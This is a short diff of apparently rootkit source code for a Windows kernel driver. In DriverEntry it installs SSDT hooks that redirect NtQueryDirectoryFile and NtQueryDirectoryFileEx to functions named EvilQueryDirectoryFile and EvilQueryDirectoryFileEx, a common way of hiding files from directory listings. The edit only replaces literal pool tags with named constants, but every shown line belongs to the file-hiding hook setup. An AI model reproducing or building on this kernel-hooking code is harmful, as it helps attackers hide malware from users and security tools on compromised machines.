@@ -15,11 +15,11 @@ extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING Re
         //ShrootUnload(DriverObject);
         //return STATUS_UNSUCCESSFUL;
     //}
-    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, 'HkQr'))) {
+    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, NTQUERY_TAG))) {
         //ShrootUnload(DriverObject);
         return STATUS_UNSUCCESSFUL;
     }
-    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, 'HkQx'))) {
+    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, NTQUERYEX_TAG))) {
         //ShrootUnload(DriverObject);
         return STATUS_UNSUCCESSFUL;
     }
